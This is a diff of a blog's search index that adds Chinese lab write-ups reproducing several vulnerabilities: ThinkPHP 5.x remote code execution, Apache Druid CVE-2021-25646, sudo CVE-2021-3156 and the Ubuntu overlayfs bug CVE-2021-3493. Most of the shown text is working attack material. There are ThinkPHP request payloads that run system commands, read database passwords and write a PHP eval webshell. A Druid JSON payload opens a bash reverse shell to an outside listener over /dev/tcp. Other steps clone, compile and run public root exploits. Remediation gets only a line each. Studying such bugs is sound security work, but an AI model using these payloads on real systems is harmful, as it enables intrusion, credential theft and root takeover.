+<p>2、构建 POC 并发包<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/2.png"></p>
+<p>3、使用蚁剑连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/3.png"></p>
+<p>POC：<br>通过发包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Linux）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot; &gt; 1.php</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Windows）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo ^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure>
+<p>通过 URL</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  查看数据库用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.username</span><br><span class="line"></span><br><span class="line">#  查看数据库密码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.password</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  phpinfo</span><br><span class="line">index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
+<h3 id="其他版本-POC"><a href="#其他版本-POC" class="headerlink" title="其他版本 POC"></a>其他版本 POC</h3><h4 id="当-PHP7-以上无法使用-Assert-的时候用"><a href="#当-PHP7-以上无法使用-Assert-的时候用" class="headerlink" title="当 PHP7 以上无法使用 Assert 的时候用"></a>当 PHP7 以上无法使用 Assert 的时候用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;包含&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+<h5 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\View&#x2F;display&amp;content&#x3D;%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data&#x3D;1</span><br></pre></td></tr></table></figure>
+<h5 id="ThinkPHP-5-0-21"><a href="#ThinkPHP-5-0-21" class="headerlink" title="ThinkPHP 5.0.21"></a>ThinkPHP 5.0.21</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
+<h5 id="ThinkPhP-5-1"><a href="#ThinkPhP-5-1" class="headerlink" title="ThinkPhP 5.1.*"></a>ThinkPhP 5.1.*</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;system&amp;data&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到5.0.24及以上，不开启debug模式</p>
+<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a><br><a href="https://blog.csdn.net/qq_29647709/article/details/84956221">https://blog.csdn.net/qq_29647709/article/details/84956221</a><br><a href="https://www.freebuf.com/vuls/194127.html">https://www.freebuf.com/vuls/194127.html</a></p>
+]]></content>
+      <categories>
+        <category>ThinkPHP 漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>ThinkPHP 漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Druid CVE-2021-25646 RCE 漏洞复现</title>
+    <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/</url>
+    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。 另外，Druid 还有一个关键的特点：它支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中用到它。</p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。<br>Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。</p>
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Druid &lt; 0.20.1</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取 druid 镜像</span><br><span class="line">sudo docker pull fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  重启 docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">#  启动 druid 环境</span><br><span class="line">sudo docker run -d -p 8888:8888 fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、Win10 监听 9999 端口</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-1.png"></p>
+<p>2、访问 <code>http://192.168.10.233:8888/unified-console.html</code> 并单击 <code>Load data</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-1.png"></p>
+<p>3、在 <code>Base directory</code> 跟 <code>File filter</code> 处分别填入如下内容，然后单击 <code>Next: Parse data</code> 并抓包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quickstart&#x2F;tutorial&#x2F;</span><br><span class="line">wikiticker-2015-09-12-sampled.json.gz</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-2.png"></p>
+<p>4、使用 BP 抓包后构建poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart&#x2F;tutorial&#x2F;&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.10.114&#x2F;9999 0&gt;&amp;1&#39;)&#125;&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;dimension&quot;:&quot;added&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;&quot;:&#123;</span><br><span class="line"> </span><br><span class="line">&quot;enabled&quot;:&quot;true&quot;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;79a5be988bf94d42a6f219b63ff27383&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/bp.png"></p>
+<p>5、此时 Win10 已收到反弹的shell</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-2.png"></p>
+<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到最新版本</p>
+<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113573652">https://blog.csdn.net/xuandao_ahfengren/article/details/113573652</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Apache Druid 漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux sudo CVE-2021-3156 提权漏洞复现</title>
+    <url>/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>sudo是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p>
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Sudo 1.8.2 - 1.8.31p2</p>
+<p>Sudo 1.9.0 - 1.9.5p1</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取环境</span><br><span class="line">sudo docker pull manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4</span><br><span class="line">#  运行环境</span><br><span class="line">sudo docker run -it manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>新建测试用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test</span><br><span class="line">echo test:123 | chpasswd</span><br><span class="line">su test</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/test_user.png"></p>
+<p>查看 sudo 版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/sudo_version.png"></p>
+<p>查看系统版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/system_version.png"></p>
+<p>找一个有写入权限的目录并下载运行 <a href="https://github.com/blasty/CVE-2021-3156">exp</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156.git</span><br><span class="line">cd CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">chmod +x sudo-hax-me-a-sandwich</span><br><span class="line">.&#x2F;sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/exp.png"></p>
+<p>查看 <a href="https://github.com/blasty/CVE-2021-3156">exp</a> 可用目标</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/target.png"></p>
+<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="http://blog.nsfocus.net/cve-2021-3156/">http://blog.nsfocus.net/cve-2021-3156/</a></p>
+<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/Rain99-/p/14354452.html">https://www.cnblogs.com/Rain99-/p/14354452.html</a></p>
+<p><a href="https://www.cnblogs.com/yujin2020/p/14377503.html">https://www.cnblogs.com/yujin2020/p/14377503.html</a></p>
+<p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113447282">https://blog.csdn.net/xuandao_ahfengren/article/details/113447282</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Linux 漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内核提权 CVE-2021-3493 漏洞复现</title>
+    <url>/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p><strong>OverlayFS</strong> 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统</p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限</p>
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Ubuntu 20.10</p>
+<p>Ubuntu 20.04 LTS</p>
+<p>Ubuntu 18.04 LTS</p>
+<p>Ubuntu 16.04 LTS</p>
+<p>Ubuntu 14.04 ESM</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  下载 ubuntu 20.04.1 镜像</span><br><span class="line">http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;ubuntu-20.04.1-desktop-amd64.iso</span><br><span class="line"></span><br><span class="line">#  如上述链接访问失败，则访问如下链接进行下载</span><br><span class="line">http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;</span><br></pre></td></tr></table></figure>
+<p>安装步骤参考：<a href="https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html">https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html</a></p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、进入系统后先尝试下载 <a href="https://github.com/ASkyeye/CVE-2021-3493.git">POC</a> ，看看是否有对当前所在的文件夹有写入的权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ASkyeye&#x2F;CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/1.png"></p>
+<p>此时可发现当用户对 “/“ 目录没有写入权限，此时需要进入一个有写入权限的目录进行下载（普通用户有写入权限的目录常见为：/tmp、桌面、/home/用户名）</p>
+<p>2、进入一个有写入权限的目录，然后重新尝试下载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ASkyeye&#x2F;CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/2.png"></p>
+<p>3、下载完后进入目录，然后进行编译，最后再给编译完后的文件添加执行权限并运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd CVE-2021-3493&#x2F;</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit.c</span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/3.png"></p>
+<p>此时可看到已获取到管理员权限（ ”#“ 号代表管理员权限）</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/4.png"></p>
+<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新到新版本</p>
+<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p>
+<p><a href="https://ubuntu.com/security/CVE-2021-3493">https://ubuntu.com/security/CVE-2021-3493</a></p>
+<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52</a></p>
+<p><a href="https://www.openwall.com/lists/oss-security/2021/04/16/1">https://www.openwall.com/lists/oss-security/2021/04/16/1</a></p>
+<p><a href="https://github.com/ASkyeye/CVE-2021-3493">https://github.com/ASkyeye/CVE-2021-3493</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>if __name__ = &#39;__main__&#39;</title>
     <url>/2021/02/09/Python/%E5%87%BD%E6%95%B0/if__name__=&#39;__main__&#39;/if__name__=&#39;__main__&#39;/</url>
     <content><![CDATA[<h2 id="if-name-‘-main-‘"><a href="#if-name-‘-main-‘" class="headerlink" title="if __name__ == ‘__main__‘"></a>if __name__ == ‘__main__‘</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    def_test()</span><br></pre></td></tr></table></figure>
@@ -518,453 +1027,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Apache Druid CVE-2021-25646 RCE 漏洞复现</title>
-    <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/</url>
